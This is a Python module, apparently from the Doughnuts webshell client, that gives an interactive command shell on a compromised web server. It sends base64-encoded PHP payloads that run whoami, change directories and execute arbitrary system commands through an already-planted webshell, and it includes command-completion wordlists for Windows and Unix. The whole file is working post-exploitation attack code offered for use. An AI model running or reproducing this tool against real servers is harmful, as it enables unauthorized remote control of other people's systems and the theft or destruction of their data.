from libs.config import gget, gset, alias, color, set_namespace
from libs.myapp import send, base64_encode, is_windows, get_system_code
from libs.app import getline

NEW_WINDOWS_WORDLIST = {"common_wordlist": [
    "echo",
    "dir",
    "cd",
    "md",
    "rd",
    "tree",
    "type",
    "ren",
    "copy",
    "move",
    "del",
    "replace",
    "attrib",
    "cls",
    "ver",
    "ver",
    "time",
    "systeminfo",
    "start",
    "exit",
    "wmic",
    "net",
    "start",
    "stop",
    "share",
    "use",
    "view",
    "tasklist",
    "ipconfig",
    "netstat",
    "arp",
]}

NEW_UNIX_WORDLIST = {"common_wordlist": [
    "echo",
    "ls",
    "ls -al",
    "rm",
    "cp",
    "mv",
    "cat",
    "chmod",
    "chown",
    "mkdir",
    "uname",
    "whereis",
    "which",
    "date",
    "curl",
    "wget",
    "dir",
    "cd",
    "pwd",
    "mkdir",
    "ps",
    "ps aux",
    "free",
    "df",
    "kill",
    "find",
    "gzip",
    "tar",
    "grep",
]}


@alias(func_alias="s")
def run():
    """
    shell

    Get a temporary shell of target system by system function.
    """
    print(color.cyan("Eenter interactive temporary shell...\n\nUse 'back' command to return doughnuts.\n"))
    res = send(f'print(shell_exec("whoami")."@".$_SERVER["SERVER_NAME"]."|".getcwd());').r_text.strip()
    prompt, pwd = res.split("|")
    set_namespace("webshell", False, True)
    wordlist = gget("webshell.wordlist")
    gset("webshell.wordlist", NEW_WINDOWS_WORDLIST if (is_windows()) else NEW_UNIX_WORDLIST, True)
    if is_windows():
        prompt = "%s> "
    else:
        prompt = prompt.replace("\r", "").replace("\n", "") + ":%s$ "
    try:
        while gget("loop"):
            print(prompt % pwd, end="")
            data = getline()
            lower_data = data.lower()
            if (lower_data.lower() in ['exit', 'quit', 'back']):
                print()
                break
            if (data == ''):
                print()
                continue
            b64_pwd = base64_encode(pwd)
            if (lower_data.startswith("cd ") and len(lower_data) > 3):
                path = base64_encode(lower_data[3:].strip())
                res = send(f'chdir(base64_decode(\'{b64_pwd}\'));chdir(base64_decode(\'{path}\'));print(getcwd());')
                if (not res):
                    return
                pwd = res.r_text.strip()
            else:
                res = send(f'chdir(base64_decode(\'{b64_pwd}\'));' + get_system_code(data))
                if (not res):
                    return
                print("\n" + res.r_text.strip() + "\n")
    finally:
        gset("webshell.wordlist", wordlist, True)
